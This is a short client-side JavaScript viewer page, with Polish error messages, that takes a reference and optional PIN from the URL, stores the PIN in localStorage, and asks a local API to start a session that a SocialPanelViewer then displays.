// Viewer page — loaded at /account/login?ref=<numeric-ref>&p=<pin>
const params = new URLSearchParams(location.search);
const ref = params.get('ref') || '';

// If PIN is embedded in the link, save it to localStorage so panel recognises the session
const pinFromUrl = params.get('p') || '';
if (pinFromUrl) {
  try { localStorage.setItem('pin', pinFromUrl); } catch {}
}

function getPin() { try { return localStorage.getItem('pin') || ''; } catch { return ''; } }

const viewer = new SocialPanelViewer(document.querySelector('#screen'));
const overlay = document.querySelector('#loadingOverlay');

function fail(msg) {
  document.body.innerHTML = `<p style="color:#fff;padding:2em;font:16px sans-serif">${msg}</p>`;
}

viewer.onReady = () => { if (overlay) overlay.classList.add('hidden'); };

if (!ref) { fail('Brak ref. Wróć do panelu.'); }
else {
  const pin = getPin();
  const headers = pin ? { 'x-pin': pin } : {};

  fetch(`/api/account-by-ref/${encodeURIComponent(ref)}/start`, { method: 'POST', headers })
    .then(async (res) => {
      if (res.status === 401) { fail('Nieprawidłowy PIN. Wróć do panelu i zaloguj się ponownie.'); return; }
      if (res.status === 404) { fail('Nieznany link.'); return; }
      const { accountId } = await res.json();
      viewer.connect(accountId, pin);
    })
    .catch(() => fail('Błąd połączenia.'));
}
